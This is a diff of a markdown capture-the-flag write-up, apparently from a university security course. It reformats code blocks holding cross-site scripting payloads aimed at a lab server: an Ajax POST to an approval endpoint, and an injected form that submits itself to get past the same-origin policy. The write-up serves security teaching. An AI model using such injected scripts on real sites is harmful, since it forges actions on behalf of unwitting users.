@@ -37,7 +37,8 @@ This CTF is very similar to Week 10 Challenge 1, with a small yet annoying diffe
 
 Firstly, we tried to do the same as we did on that challenge, sending a POST request using Ajax to the action that submits the approval for the flag.<br>
 
-`<script type="text/javascript">
+```html
+<script type="text/javascript">
         window.onload = function () {
                 var Ajax=null;
                 var sendurl="http://ctf-fsi.fe.up.pt:5005/request/64d2f32ef60ef1df5b6f58701f0d47fbe59c6584/approve";
@@ -45,7 +46,8 @@ Firstly, we tried to do the same as we did on that challenge, sending a POST req
                 Ajax.open("POST", sendurl, true);
                 Ajax.send();
         }
-</script>`
+</script>
+```
 
 This did not work because it triggered a CORS error:
 
@@ -61,7 +63,8 @@ Generally, if a form is submitted on a website, it won't trigger any SOP error b
 
 With this in mind, we devised a script that would inject a form onto the DOM and then submit it automatically. <br>
 
-`<script type="text/javascript">
+```html
+<script type="text/javascript">
 
     document.body.onload = function () {
 
@@ -76,7 +79,8 @@ With this in mind, we devised a script that would inject a form onto the DOM and
         document.form.submit();
 
     }
-</script>`
+</script>
+```
 
 The problem with this approach is that it will automatically redirect us to the action URL, which means we need to find a way to stop that. <br>
 
@@ -92,7 +96,8 @@ This worked perfectly, as when we loaded the page it wouldn't redirect us anymor
 
 There's only one improvement we could make, which is to make it so the script works autonomously, retrieving the request id from the URL, so we don't have to change our code every time we wanted to exploit this website.
 
-`<script type="text/javascript">
+```html
+<script type="text/javascript">
 
     document.body.onload = function () {
 
@@ -108,7 +113,7 @@ There's only one improvement we could make, which is to make it so the script wo
 
     }
 </script>
-`
+```
 
 Unfortunatelly, despite the action URL being built correctly, for some reason our request is never approved. <br>
 Since we already have the flag, we didn't give it much second thought, but decided to document this either way.
